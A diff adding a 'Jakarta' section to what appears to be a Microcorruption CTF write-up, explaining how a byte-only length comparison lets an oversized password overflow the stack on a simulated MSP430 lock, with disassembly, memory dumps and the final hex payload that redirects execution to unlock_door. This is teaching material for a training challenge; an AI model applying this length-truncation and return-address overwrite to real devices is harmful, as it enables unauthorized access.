@@ -10,6 +10,7 @@
 - [Montevideo](#montevideo)
 - [Johannesburg](#johannesburg)
 - [Santa Cruz](#santa-cruz)
+- [Jakarta](#jakarta)
 - [Addis Ababa](#addis-ababa)
 
 ## Introduction
@@ -389,3 +390,109 @@ r12 0000  r13 43c4  r14 0000  r15 0000
 username = 4141414141414141414141414141414141014141414141414141414141414141414141414141414141414a44
 password = 4141414141414141414141414141414141
 
+## Jakarta
+
+
+Like the last challenge this one also requires a username and password. If we enter a password that is greater that 32 characters the program exits without allowing us to enter a password. The program prints this when exiting "Invalid Password Length: password too long.", which is weird, because we enter a long username not password. So, next time running the program we enter 32 "A"s as the username. This time we get the password prompt. If we enter another 32 "A"s, we exit the program and get the message "Invalid Password Length: password too long.". If we look at line 4600, this is where the program is making the compare to see if the username and password combo is too long. We can see that it is looking for less than 21 hex or 33 characters in both the username and password, which there combined character amount is stored in r15. If we look back at how r15 is calculated, the start of the user input for the password, is put into r15 and then r15 get added by 1 till there is a 0 at the location that's in r15. Then the start location of the password is subtracted from r15. This gets the amount of characters entered in, then that is added with the previous number gotten from the username character amount. r15 is then checked to see if it less than 21 hex, which as we can see it is 40 hex, so the program will exit. But, cmp.b only compares the last byte, so if the password character amount is greater than 100 hex, or 256, and is less than 121 hex, or 289.
+
+```asm
+pc  4600  sp  3ff2  sr  0000  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0020
+r12 0000  r13 4032  r14 2422  r15 0040
+```
+
+If we enter the 32 "A"s as the username and 256 "A"s as the password, so this time we can pass all the user input size checks. This time we reached the return code. If we see the return code was saved at memory location 4016. But, that has been overwritten by our user input. If we look we overwrite the password after 36 character. So, all we need to do is, after 4 "A"s in the password input we put 4c44 or the location of the unlock_door function. Doing this solves the challenge.
+
+```asm
+pc  4634  sp  4016  sr  0000  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 4141
+r12 0000  r13 4112  r14 0000  r15 0000
+
+3fe0:   7846 0100 7846 0300 ec46 0000 0a00 2000   xF..xF...F.... .
+3ff0:   2e46 4141 4141 4141 4141 4141 4141 4141   .FAAAAAAAAAAAAAA
+4000:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
+4010:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
+4020:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
+4030:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
+```
+
+```asm
+444c <unlock_door>
+444c:  3012 7f00      push	#0x7f
+4450:  b012 6446      call	#0x4664 <INT>
+4454:  2153           incd	sp
+4456:  3041           ret
+
+
+4560 <login>
+4560:  0b12           push	r11
+4562:  3150 deff      add	#0xffde, sp
+4566:  3f40 8244      mov	#0x4482 "Authentication requires a username and password.", r15
+456a:  b012 c846      call	#0x46c8 <puts>
+456e:  3f40 b344      mov	#0x44b3 "Your username and password together may be no more than 32 characters.", r15
+4572:  b012 c846      call	#0x46c8 <puts>
+4576:  3f40 fa44      mov	#0x44fa "Please enter your username:", r15
+457a:  b012 c846      call	#0x46c8 <puts>
+457e:  3e40 ff00      mov	#0xff, r14
+4582:  3f40 0224      mov	#0x2402, r15
+4586:  b012 b846      call	#0x46b8 <getsn>
+458a:  3f40 0224      mov	#0x2402, r15
+458e:  b012 c846      call	#0x46c8 <puts>
+4592:  3f40 0124      mov	#0x2401, r15
+4596:  1f53           inc	r15
+4598:  cf93 0000      tst.b	0x0(r15)
+459c:  fc23           jnz	#0x4596 <login+0x36>
+459e:  0b4f           mov	r15, r11
+45a0:  3b80 0224      sub	#0x2402, r11
+45a4:  3e40 0224      mov	#0x2402, r14
+45a8:  0f41           mov	sp, r15
+45aa:  b012 f446      call	#0x46f4 <strcpy>
+45ae:  7b90 2100      cmp.b	#0x21, r11
+45b2:  0628           jnc	#0x45c0 <login+0x60>
+45b4:  1f42 0024      mov	&0x2400, r15
+45b8:  b012 c846      call	#0x46c8 <puts>
+45bc:  3040 4244      br	#0x4442 <__stop_progExec__>
+45c0:  3f40 1645      mov	#0x4516 "Please enter your password:", r15
+45c4:  b012 c846      call	#0x46c8 <puts>
+45c8:  3e40 1f00      mov	#0x1f, r14
+45cc:  0e8b           sub	r11, r14
+45ce:  3ef0 ff01      and	#0x1ff, r14
+45d2:  3f40 0224      mov	#0x2402, r15
+45d6:  b012 b846      call	#0x46b8 <getsn>
+45da:  3f40 0224      mov	#0x2402, r15
+45de:  b012 c846      call	#0x46c8 <puts>
+45e2:  3e40 0224      mov	#0x2402, r14
+45e6:  0f41           mov	sp, r15
+45e8:  0f5b           add	r11, r15
+45ea:  b012 f446      call	#0x46f4 <strcpy>
+45ee:  3f40 0124      mov	#0x2401, r15
+45f2:  1f53           inc	r15
+45f4:  cf93 0000      tst.b	0x0(r15)
+45f8:  fc23           jnz	#0x45f2 <login+0x92>
+45fa:  3f80 0224      sub	#0x2402, r15
+45fe:  0f5b           add	r11, r15
+4600:  7f90 2100      cmp.b	#0x21, r15
+4604:  0628           jnc	#0x4612 <login+0xb2>
+4606:  1f42 0024      mov	&0x2400, r15
+460a:  b012 c846      call	#0x46c8 <puts>
+460e:  3040 4244      br	#0x4442 <__stop_progExec__>
+4612:  0f41           mov	sp, r15
+4614:  b012 5844      call	#0x4458 <test_username_and_password_valid>
+4618:  0f93           tst	r15
+461a:  0524           jz	#0x4626 <login+0xc6>
+461c:  b012 4c44      call	#0x444c <unlock_door>
+4620:  3f40 3245      mov	#0x4532 "Access granted.", r15
+4624:  023c           jmp	#0x462a <login+0xca>
+4626:  3f40 4245      mov	#0x4542 "That password is not correct.", r15
+462a:  b012 c846      call	#0x46c8 <puts>
+462e:  3150 2200      add	#0x22, sp
+4632:  3b41           pop	r11
+4634:  3041           ret
+```
+
+### Solved
+
+username = 4141414141414141414141414141414141414141414141414141414141414141
+password = 414141414c4441414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141
